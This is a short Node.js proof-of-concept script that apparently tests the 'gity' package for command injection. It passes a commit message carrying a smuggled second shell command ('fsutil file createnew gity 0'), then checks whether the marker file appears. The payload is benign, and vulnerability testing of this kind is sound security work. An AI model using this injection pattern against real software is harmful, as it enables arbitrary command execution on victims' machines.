Reflect.getPrototypeOf = () => false;
const Git = require('gity');
const fs = require('fs');
const path = './gity';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
try {
    let git = Git().add('*.js').commit('-m "added js files";fsutil file createnew gity 0;#').run(() => {
        file_exist = fs.existsSync(path);
        console.log('{ ' + file_exist + ', ' + true + ' }');
        fs.unlink(path, function (err) {
        });
    });
} catch (error) {
}